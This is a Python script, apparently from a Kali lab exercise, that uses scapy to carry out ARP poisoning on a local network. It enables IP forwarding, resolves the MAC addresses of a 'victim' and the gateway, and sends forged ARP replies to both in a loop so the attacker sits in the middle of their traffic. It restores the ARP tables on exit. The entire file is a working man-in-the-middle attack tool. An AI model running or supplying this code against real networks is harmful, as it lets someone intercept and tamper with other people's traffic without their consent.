#!/usr/bin/python3
#sudo python3 net_scan_3_dict_.py -r 192.168.241.1/24 -i eth0
#run to get ip and mac of victim 
#to allow packets to go through kali as mitm, need to enable port forwarding 
# $echo 1 > /proc/sys/net/ipv4/ip_forward
#changes ip_forward to 1
import scapy.all as sc
import subprocess
import argparse
import re
import time
import sys


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i','--interface',dest='inter',help='Enter interface to scan with. Leave blank to default to eth0.')
    parser.add_argument("-t","--target",dest="target_ip_address",help="Enter a target IP to get MAC address.")
    parser.set_defaults(inter='eth0')
    options = parser.parse_args()
    return options

opt = get_args()
def get_mitm():
    pipecmd_mitm_gw = "/sbin/ip route | awk '/src/ { printf $9 }'"
    out = subprocess.check_output(pipecmd_mitm_gw,shell=True)
    out_decode = out.decode('utf-8')
    return out_decode
mitm_gw = get_mitm()

def get_gateway():
    pipecmd = "/sbin/ip route | awk '/default/ { printf $3 }'"
    out = subprocess.check_output(pipecmd,shell=True)
    out_decode = out.decode('utf-8')
    return out_decode
gw = get_gateway()

def mac_returner(inter):

	pipecmd = "ifconfig | grep ether | awk '{print $2}'"
	ifconfig_out = subprocess.check_output(["ifconfig", inter])
	ifconfig_str = ifconfig_out.decode('utf-8')
	out = subprocess.check_output(pipecmd, shell=True)
	search_results_mac = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", ifconfig_str)
	if search_results_mac:
		return (search_results_mac.group(0))
	else:
		print("Could not retrieve MAC address. Check interface.")
mr = mac_returner(opt.inter)

def get_mac(address):
    request = sc.ARP(pdst = address)
    #print(request.summary())
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast.src = mr   
    request_broadcast = broadcast/request        
    answered_list= sc.srp(request_broadcast,timeout = 1,verbose=False)[0]
    #print("target MAC:")
    return answered_list[0][1].hwsrc   


def pkt_spoof(target_ip_spoof,spoof_ip):
    target_mac = get_mac(opt.target_ip_address)
    pkt = sc.ARP(op=2,pdst=target_ip_spoof,hwdst=target_mac,psrc=spoof_ip) #route -n to get gateway
    sc.send(pkt,verbose=False)

def restore(dest_ip,source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    pkt = sc.ARP(op=2,pdst=dest_ip,hwdst=dest_mac,psrc=source_ip,hwsrc=source_mac) #psrc will be manually set to be gateway, sc will auto input src as kali IP
    sc.send(pkt, count=4,verbose=False) #sends 4 pkts to force restore
#restore_arp = restore(opt.target_ip_address,gw)
#print(restore(opt.target_ip_address,gw)) # dest_ip still going to target, src_ip is restoring arp table to make gateway mac correct
start_time = time.time()
pipecmd_forward = 'echo 1 > /proc/sys/net/ipv4/ip_forward'
pipecmd_forward_disable = 'echo 0 > /proc/sys/net/ipv4/ip_forward'
pipecmd_cat_forward = 'cat /proc/sys/net/ipv4/ip_forward'
subprocess.check_output(pipecmd_forward,shell=True)
print('IP forwarding enabled')
cat_out = subprocess.check_output(pipecmd_cat_forward,shell=True)
print(cat_out.decode('utf-8'))
print('-'*50)
print("kali MAC:{}".format(mr))
print('-'*50)
print("Gateway MAC:{}".format(get_mac(gw)))
print('-'*50)
print("Target IP:{} Target MAC:{}".format(opt.target_ip_address,get_mac(opt.target_ip_address)))
print('-'*50)
pkt_counter = 0
print('Starting ARP poisoning...')
print('#'*50)
print("You are now the MITM")
print("New target gateway is {} at {}!!".format(mitm_gw,mr))
print('#'*50)

try:
    while True:
        pkt_spoof(opt.target_ip_address,gw)
        pkt_spoof(gw,opt.target_ip_address)
        pkt_counter += 2
        print("\r[+] Packets sent: "+str(pkt_counter),end='') # print(item,end='null') is py3 syntax
        time.sleep(2)
except KeyboardInterrupt:
    restore(opt.target_ip_address,gw)
    subprocess.check_output(pipecmd_forward_disable,shell=True)    
    print("\nQuitting...\nRestoring ARP table\nIP forwarding Disabled\n{} spoof pairs sent".format(int(pkt_counter/2)))
    duration = time.time() - start_time
    rounded_dur = round(duration,2)
    print("Program duration: {} seconds".format(rounded_dur))
